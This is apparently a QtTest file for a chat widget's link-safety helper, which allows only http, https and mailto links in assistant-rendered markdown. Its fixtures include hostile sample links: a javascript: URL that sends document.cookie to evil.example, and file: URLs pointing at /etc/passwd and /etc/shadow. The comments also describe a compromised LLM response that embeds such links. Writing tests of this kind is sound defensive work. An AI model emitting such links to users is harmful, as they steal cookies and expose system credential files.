import QtQuick
import QtTest 1.0

import "../../shared/chat-module/ui/LinkSafety.js" as LinkSafety

// Acceptance tests for the markdown-link scheme allowlist (#11).
//
// Background
// ----------
// `ChatView.qml` renders assistant messages with `Text.MarkdownText`. A
// hostile daemon (or a compromised LLM response) could embed
// `[click me](javascript:fetch(...))`, `magnet:?xt=...`, custom-scheme,
// or `file:///etc/passwd` URLs. Until #11 these all flowed straight into
// `Qt.openUrlExternally`, which hands them to the user's URL handler.
//
// The fix factors the policy decision into a pure JS helper so it can be
// unit-tested without instantiating the full ChatView (which depends on
// `org.kde.plasma.plasmoid` and friends that aren't loadable from a
// generic qmltestrunner environment).
//
// The helper exposes:
//   - LinkSafety.isAllowedScheme(link)  -> bool
//   - LinkSafety.openLinkSafely(link, opener)
//       opener: function(url) — called only when the scheme passes
//       In production callers pass `Qt.openUrlExternally`.
//
TestCase {
    id: testCase
    name: "LinkSafety"

    property var openedUrls: []
    property var warned: []

    function init() {
        openedUrls = []
        warned = []
    }

    function _opener(url) {
        openedUrls.push(url)
    }

    // ── Pure scheme-check tests ──────────────────────────────────────────

    function test_isAllowedScheme_http() {
        verify(LinkSafety.isAllowedScheme("http://example.com/"))
    }

    function test_isAllowedScheme_https() {
        verify(LinkSafety.isAllowedScheme("https://example.com/path?q=1"))
    }

    function test_isAllowedScheme_mailto() {
        verify(LinkSafety.isAllowedScheme("mailto:user@example.com"))
    }

    function test_isAllowedScheme_javascript_rejected() {
        verify(!LinkSafety.isAllowedScheme("javascript:alert(1)"))
    }

    function test_isAllowedScheme_magnet_rejected() {
        verify(!LinkSafety.isAllowedScheme("magnet:?xt=urn:btih:abc"))
    }

    function test_isAllowedScheme_file_rejected() {
        verify(!LinkSafety.isAllowedScheme("file:///etc/passwd"))
    }

    function test_isAllowedScheme_data_rejected() {
        // data: URLs are commonly used for XSS-like vectors; not on the
        // allowlist.
        verify(!LinkSafety.isAllowedScheme("data:text/html,<script>1</script>"))
    }

    function test_isAllowedScheme_custom_scheme_rejected() {
        verify(!LinkSafety.isAllowedScheme("steam://run/440"))
    }

    function test_isAllowedScheme_case_insensitive() {
        verify(LinkSafety.isAllowedScheme("HTTPS://example.com"))
        verify(LinkSafety.isAllowedScheme("Mailto:user@example.com"))
        verify(!LinkSafety.isAllowedScheme("JavaScript:alert(1)"))
    }

    function test_isAllowedScheme_no_scheme_rejected() {
        // Bare strings / relative paths must not slip through as if they
        // were a permitted scheme. Markdown like `[x](not-a-url)` arrives
        // here without a colon.
        verify(!LinkSafety.isAllowedScheme("not-a-url"))
        verify(!LinkSafety.isAllowedScheme(""))
        verify(!LinkSafety.isAllowedScheme("/usr/bin/evil"))
    }

    function test_isAllowedScheme_empty_scheme_rejected() {
        // A leading colon means an empty scheme — must not be confused
        // with any allowed scheme.
        verify(!LinkSafety.isAllowedScheme(":foo"))
    }

    function test_isAllowedScheme_null_safe() {
        // Defensive: null/undefined must return false, not throw.
        verify(!LinkSafety.isAllowedScheme(null))
        verify(!LinkSafety.isAllowedScheme(undefined))
    }

    // ── Required-by-the-issue named tests ────────────────────────────────

    function test_javascript_scheme_link_does_not_open() {
        LinkSafety.openLinkSafely("javascript:alert(1)", _opener)
        compare(openedUrls.length, 0, "javascript: must not reach opener")
    }

    function test_magnet_scheme_link_does_not_open() {
        LinkSafety.openLinkSafely("magnet:?xt=urn:btih:deadbeef", _opener)
        compare(openedUrls.length, 0, "magnet: must not reach opener")
    }

    function test_file_scheme_link_does_not_open() {
        LinkSafety.openLinkSafely("file:///etc/passwd", _opener)
        compare(openedUrls.length, 0, "file: must not reach opener")
    }

    function test_http_link_opens() {
        LinkSafety.openLinkSafely("http://example.com/", _opener)
        compare(openedUrls.length, 1)
        compare(openedUrls[0], "http://example.com/")
    }

    function test_https_link_opens() {
        LinkSafety.openLinkSafely("https://example.com/x?y=1", _opener)
        compare(openedUrls.length, 1)
        compare(openedUrls[0], "https://example.com/x?y=1")
    }

    function test_mailto_link_opens() {
        LinkSafety.openLinkSafely("mailto:user@example.com?subject=hi", _opener)
        compare(openedUrls.length, 1)
        compare(openedUrls[0], "mailto:user@example.com?subject=hi")
    }

    function test_malformed_url_does_not_crash() {
        // `not-a-url` has no scheme. The helper must reject it cleanly —
        // no exception, no opener invocation. We expect a console.warn,
        // but we don't make the test brittle by asserting on the warn
        // string; the contract is "does not crash and does not open".
        LinkSafety.openLinkSafely("not-a-url", _opener)
        compare(openedUrls.length, 0, "malformed url must not reach opener")
    }

    // ── Business-outcome integration check ───────────────────────────────

    function test_business_outcome_hostile_assistant_link_does_not_trigger_qt_openurl() {
        // Scenario: the assistant emits a hostile markdown link. The user
        // clicks it. `Qt.openUrlExternally` (the real handler that hands
        // the URL to the user's URL handler) must NOT be invoked.
        //
        // We model this by passing a stub opener that records calls —
        // the same shape as `Qt.openUrlExternally` — and asserting the
        // stub is never called for hostile schemes, while it IS called
        // for benign ones, in a single end-to-end scenario.
        var calls = []
        var stubOpener = function(u) { calls.push(u) }

        // A hostile assistant message containing a mix of links.
        var links = [
            "javascript:fetch('https://evil.example/'+document.cookie)",
            "magnet:?xt=urn:btih:badbadbad",
            "file:///etc/shadow",
            "data:text/html,<script>1</script>",
            "https://example.org/benign",
        ]
        for (var i = 0; i < links.length; ++i) {
            LinkSafety.openLinkSafely(links[i], stubOpener)
        }

        compare(calls.length, 1, "exactly one benign link reaches the opener")
        compare(calls[0], "https://example.org/benign")
    }
}
